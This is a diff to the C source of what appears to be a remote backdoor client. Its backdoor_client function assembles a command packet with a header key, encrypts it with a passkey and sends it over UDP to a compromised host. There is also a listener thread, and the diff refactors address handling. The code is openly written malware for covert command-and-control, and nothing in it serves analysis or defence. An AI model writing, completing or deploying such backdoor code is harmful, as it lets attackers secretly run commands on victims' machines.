@@ -13,7 +13,7 @@
 
 int closing;
 
-void backdoor_client(char *ipaddr, int dport, int duplex)
+void backdoor_client(uint32 ipaddr, int dport, int duplex)
 {
 	int sock;
 	struct sockaddr_in saddr;
@@ -23,7 +23,7 @@ void backdoor_client(char *ipaddr, int dport, int duplex)
 	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 	bzero(&saddr, sizeof(saddr));
 	
-	if (!val_addr(ipaddr))
+	if (ipaddr == 0)
 		error("Invalid IP specified.");
 
 	if (!val_port(dport))
@@ -46,9 +46,12 @@ void backdoor_client(char *ipaddr, int dport, int duplex)
 		char *ptr = buff;
 		char *enc;
 		int len;
+		int hdr_len;
+
+		hdr_len = strlen(HDR_KEY) + 1;
 	
-		memcpy(ptr, HDR_KEY, HDR_LEN);
-		ptr += HDR_LEN;
+		memcpy(ptr, HDR_KEY, hdr_len);
+		ptr += hdr_len;
 		memcpy(ptr, CMD_STR, strlen(CMD_STR));
 		ptr += strlen(CMD_STR);
 		memcpy(ptr, command, strlen(command));
@@ -58,11 +61,11 @@ void backdoor_client(char *ipaddr, int dport, int duplex)
 		
 		len = strlen(buff);
 
-		ptr = buff + HDR_LEN;
+		ptr = buff + hdr_len;
 		
-		enc = encrypt(PASSKEY, ptr, len - HDR_LEN);
+		enc = encrypt(PASSKEY, ptr, len - hdr_len);
 
-		memcpy(ptr, enc, len - HDR_LEN);
+		memcpy(ptr, enc, len - hdr_len);
 	
 		sendto(sock, buff, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
@@ -108,12 +111,6 @@ void *listen_thread(void *arg)
 	}
 
 	return NULL;
-}
-
-int val_addr(char *addr)
-{
-	struct sockaddr_in saddr;
-	return inet_pton(AF_INET, addr, &(saddr.sin_addr));
 }
 
 int val_port(int port)
